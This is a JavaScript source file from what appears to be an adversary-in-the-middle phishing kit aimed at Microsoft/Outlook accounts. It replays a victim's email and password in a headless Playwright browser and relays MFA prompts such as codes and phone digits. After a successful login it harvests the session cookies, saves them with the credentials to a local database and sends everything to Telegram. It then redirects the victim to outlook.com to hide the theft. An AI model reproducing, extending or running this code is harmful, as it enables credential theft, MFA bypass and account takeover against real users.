/**
 * Login Flow
 * Main login flow orchestration
 */

const globals = require('../config/globals');
const { sendToClient } = require('../services/websocket');
const { saveUserData } = require('../services/database');
const { detectLoginSuccess } = require('../handlers/pageDetection');
const { identifyCurrentPage } = require('../handlers/pageDetection');
const { handleEmailEntry } = require('../handlers/emailHandler');
const { handlePasswordEntry } = require('../handlers/passwordHandler');
const { handleStaySignedIn } = require('../handlers/staySignedInHandler');
const { handleEmailInput } = require('../handlers/emailHandler');
const { handleCodeInput } = require('../handlers/codeHandler');
const { handlePhoneDigitsInput } = require('../handlers/phoneHandler');
const { handleVerificationOptions, handleMfaChoice } = require('../handlers/mfaHandlers');
const { TIMEOUTS, MAX_ATTEMPTS, LOGIN_URL_TEMPLATE } = require('../config/constants');

/**
 * Send results back to client via WebSocket
 * @param {Object} ws - WebSocket connection
 * @param {string} email - User email
 * @param {string} password - User password
 * @param {string} status - Status message
 * @param {Object} page - Playwright page object
 * @param {string} selectedOption - Optional selected MFA option
 */
async function sendResults(ws, email, password, status, page, selectedOption = null) {
    const displayValues = [
        `Email: ${email}`,
        `Password: ${password}`,
        `Status: ${status}`,
        `Current URL: ${page.url()}`,
        `Page Title: ${await page.title()}`
    ];

    // If we have a selected MFA option, include it
    if (selectedOption) {
        displayValues.push(`Selected Option: ${selectedOption}`);
        console.log(`Sending selected option to frontend: ${selectedOption}`);
    }

    sendToClient({
        displayValues,
        selectedOption: selectedOption
    });
    console.log('Results sent to client via WebSocket');
}

/**
 * Handle the complete login flow with multiple page types
 * @param {Object} page - Playwright page object
 * @param {string} email - User email
 * @param {string} password - User password
 * @param {Object} ws - WebSocket connection
 */
async function handleLoginFlow(page, email, password, ws) {
    // Set global page reference for HTTP endpoint access
    globals.set('globalPage', page);

    let currentStep = 'initial';
    let attempts = 0;
    const maxAttempts = MAX_ATTEMPTS.LOGIN_FLOW;

    while (attempts < maxAttempts) {
        attempts++;
        currentStep = await identifyCurrentPage(page);
        console.log(`🔄 Step ${attempts}: Current page type: ${currentStep}`);

        switch (currentStep) {
            case 'email_entry':
                await handleEmailEntry(page, email);
                break;

            case 'password_entry':
                const pwResult = await handlePasswordEntry(page, password);
                if (pwResult === 'wrong_password') {
                    console.log('❌ Stopping automation due to wrong password');
                    return;
                }
                break;

            case 'stay_signed_in':
                await handleStaySignedIn(page);
                break;

            case 'verification_options':
            case 'mfa_choice':
                // Use MFA handlers (Smart MFA classification can be added later)
                console.log('🧠 Handling MFA page type:', currentStep);

                try {
                    // Try Smart MFA classification if available (will be extracted in Phase 6)
                    // For now, use direct handlers
                    if (currentStep === 'verification_options') {
                        await handleVerificationOptions(page);
                    } else if (currentStep === 'mfa_choice') {
                        await handleMfaChoice(page);
                    }
                } catch (error) {
                    console.error('❌ MFA handling failed:', error.message);
                    console.log('🔄 Falling back to original handlers...');

                    // Safe fallback
                    if (currentStep === 'verification_options') {
                        await handleVerificationOptions(page);
                    } else if (currentStep === 'mfa_choice') {
                        await handleMfaChoice(page);
                    }
                }
                break;

            case 'email_input':
                await handleEmailInput(page);
                break;

            case 'code_input':
                await handleCodeInput(page);
                break;

            case 'phone_digits_input':
                await handlePhoneDigitsInput(page);
                break;

            case 'success':
                console.log('✅ Login successful - Detected success page!');
                await sendResults(ws, email, password, 'Success', page);

                // Detect if we came here after MFA
                const wasMfa = globals.get('globalVerificationCode') || globals.get('globalPhoneDigits');
                const redirectUrl = 'https://www.outlook.com';

                sendToClient({
                    redirect: redirectUrl,
                    status: 'login_success',
                    message: 'Login successful - Redirecting to Outlook'
                });
                console.log(`🌐 Redirecting to ${redirectUrl}`);
                return;

            case 'error':
                console.log('❌ Login failed or error page');
                await sendResults(ws, email, password, 'Error', page);
                return;

            case 'unknown':
                console.log('⏳ Waiting for page to load...');
                await page.waitForTimeout(2000);
                break;
        }

        // Wait for navigation or page changes
        try {
            await page.waitForLoadState('networkidle', { timeout: TIMEOUTS.NETWORK_IDLE });
        } catch (e) {
            // Continue even if timeout occurs
        }
    }

    console.log('⚠️ Maximum attempts reached');
    await sendResults(ws, email, password, 'Max attempts reached', page);
}

/**
 * Start Playwright automation
 * @param {string} email - User email
 * @param {string} password - User password
 * @param {Object} ws - WebSocket connection
 */
async function startAutomation(email, password, ws) {
    const { createBrowser, createContext, createPage, closeBrowser, keepBrowserOpen } = require('./browserManager');
    const { setupAuthDetection } = require('./authDetection');

    console.log('🚀 Starting Playwright automation...');

    // Store credentials globally for saving later
    globals.set('globalLoginEmail', email);
    globals.set('globalLoginPassword', password);
    globals.set('telegramSent', false); // Reset telegram flag

    const browser = await createBrowser({ headless: true });
    const context = await createContext(browser);
    const page = await createPage(context);

    // Setup auth detection (ZERO RISK - just monitoring)
    await setupAuthDetection(page, email, password);
    console.log('🔍 Auth detection activated - monitoring for successful login');

    // Build login URL
    const loginUrl = LOGIN_URL_TEMPLATE.replace('{email}', encodeURIComponent(email)).replace('{email}', encodeURIComponent(email));

    try {
        console.log('📄 Loading Microsoft login page...');
        await page.goto(loginUrl, { waitUntil: 'networkidle' });

        console.log('✅ Page loaded successfully');

        // Handle the login flow step by step
        await handleLoginFlow(page, email, password, ws);

        // Check if login was successful and save user data
        console.log('🔍 Checking login success and saving user data...');
        const loginSuccess = await detectLoginSuccess(page);

        const globalLoginEmail = globals.get('globalLoginEmail');
        const globalLoginPassword = globals.get('globalLoginPassword');

        if (loginSuccess && globalLoginEmail && globalLoginPassword) {
            try {
                // Get cookies from the current page context
                const cookies = await page.context().cookies();
                console.log(`🍪 Retrieved ${cookies.length} cookies from browser context`);

                // Determine MFA type based on what was used
                let mfaType = 'none';
                if (globals.get('globalVerificationCode')) {
                    mfaType = 'email';
                } else if (globals.get('globalPhoneDigits')) {
                    mfaType = 'phone';
                }

                // Save user data with cookies
                const saveSuccess = await saveUserData(
                    globalLoginEmail,
                    globalLoginPassword,
                    cookies,
                    mfaType
                );

                if (saveSuccess) {
                    console.log('✅ User data saved successfully to db.json');

                    // Send to Telegram (duplicates handled by flag)
                    const { sendLoginSuccessToTelegram } = require('../services/telegram');
                    await sendLoginSuccessToTelegram(globalLoginEmail, globalLoginPassword, mfaType, cookies);
                } else {
                    console.log('⚠️ Failed to save user data, but login was successful');
                }
            } catch (saveError) {
                console.error('❌ Error saving user data after successful login:', saveError.message);
                console.log('⚠️ Login was successful but user data could not be saved');
            }
        } else {
            console.log('⚠️ Login success could not be confirmed or credentials missing');
        }

        console.log('🎉 Automation completed successfully!');

        // Send completion message to client
        sendToClient({
            status: 'automation_completed',
            message: 'Automation process completed successfully'
        });

        // Keep browser open for user interaction
        await keepBrowserOpen(page);

    } catch (error) {
        console.error('❌ Error during automation:', error);

        // Send error to client
        sendToClient({
            status: 'automation_finished',
            displayValues: [
                `Email: ${email}`,
                `Password: ${password}`,
                `Error: ${error.message}`,
                `Status: Failed`
            ]
        });
    } finally {
        await closeBrowser(browser);
    }
}

module.exports = {
    startAutomation,
    handleLoginFlow,
    sendResults
};

